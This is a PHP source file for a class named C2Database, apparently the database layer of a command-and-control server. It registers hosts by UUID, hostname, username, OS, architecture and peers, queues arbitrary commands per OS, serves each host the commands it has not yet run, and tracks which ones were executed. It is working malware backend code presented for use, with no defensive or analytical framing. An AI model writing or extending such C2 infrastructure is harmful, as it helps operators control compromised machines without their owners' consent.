<?php
declare(strict_types=1);

class C2Database
{
    private PDO $pdo;

    public function __construct(string $host, string $name, string $user, string $pass)
    {
        $dsn = "mysql:host={$host};dbname={$name};charset=utf8mb4";
        $this->pdo = new PDO($dsn, $user, $pass, [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
    }

    public function upsertHost(
        string $uuid,
        ?string $hostname,
        ?string $username,
        ?string $os,
        ?string $arch,
        ?array  $peers
    ): void {
        $stmt = $this->pdo->prepare(<<<'SQL'
INSERT INTO hosts (uuid, hostname, username, os, arch, peers)
VALUES (:uuid, :hn, :user, :os, :arch, :peers)
ON DUPLICATE KEY UPDATE
  hostname = VALUES(hostname),
  username = VALUES(username),
  os       = VALUES(os),
  arch     = VALUES(arch),
  peers    = VALUES(peers),
  ts       = CURRENT_TIMESTAMP
SQL);
        $stmt->execute([
            ':uuid'  => $uuid,
            ':hn'    => $hostname,
            ':user'  => $username,
            ':os'    => $os,
            ':arch'  => $arch,
            ':peers' => $peers !== null ? json_encode($peers, JSON_THROW_ON_ERROR) : null,
        ]);
    }

    public function getHost(string $uuid): ?array
    {
        $stmt = $this->pdo->prepare('SELECT * FROM hosts WHERE uuid = :uuid');
        $stmt->execute([':uuid' => $uuid]);
        $row = $stmt->fetch();
        if (!$row) {
            return null;
        }
        $row['peers'] = $row['peers'] !== null ? json_decode($row['peers'], true) : null;
        return $row;
    }

    public function deleteHost(string $uuid): void
    {
        $stmt = $this->pdo->prepare('DELETE FROM hosts WHERE uuid = :uuid');
        $stmt->execute([':uuid' => $uuid]);
    }

    public function listHosts(): array
    {
        $rows = $this->pdo->query('SELECT * FROM hosts ORDER BY ts DESC')->fetchAll();
        foreach ($rows as &$row) {
            $row['peers'] = $row['peers'] !== null ? json_decode($row['peers'], true) : null;
        }
        return $rows;
    }

    public function addCommand(string $commandText, ?string $osFilter = null): int
    {
        $stmt = $this->pdo->prepare('
            INSERT INTO commands (command_text, os_filter)
            VALUES (:cmd, :os)
        ');
        $stmt->execute([
            ':cmd' => $commandText,
            ':os'  => $osFilter,
        ]);
        return (int)$this->pdo->lastInsertId();
    }

    public function deleteCommand(int $commandId): void
    {
        $stmt = $this->pdo->prepare('DELETE FROM commands WHERE id = :id');
        $stmt->execute([':id' => $commandId]);
    }

    public function listCommands(): array
    {
        return $this->pdo->query('SELECT * FROM commands ORDER BY created_at DESC')->fetchAll();
    }

    public function fetchPendingCommands(string $uuid, string $os): array
    {
        $stmt = $this->pdo->prepare(<<<'SQL'
SELECT c.id, c.command_text
FROM commands AS c
LEFT JOIN executed_commands AS e
  ON c.id = e.command_id
  AND e.host_uuid = :uuid
WHERE e.command_id IS NULL
  AND (c.os_filter IS NULL OR c.os_filter = :os)
ORDER BY c.created_at ASC
SQL);
        $stmt->execute([
            ':uuid' => $uuid,
            ':os'   => $os,
        ]);
        return $stmt->fetchAll();
    }

    public function markExecuted(string $uuid, int $commandId): void
    {
        $stmt = $this->pdo->prepare('
            INSERT IGNORE INTO executed_commands (host_uuid, command_id)
            VALUES (:uuid, :cmd_id)
        ');
        $stmt->execute([
            ':uuid'   => $uuid,
            ':cmd_id' => $commandId,
        ]);
    }
    
    public function clearExecuted(string $uuid): void
    {
        $stmt = $this->pdo->prepare('DELETE FROM executed_commands WHERE host_uuid = :uuid');
        $stmt->execute([':uuid' => $uuid]);
    }
}
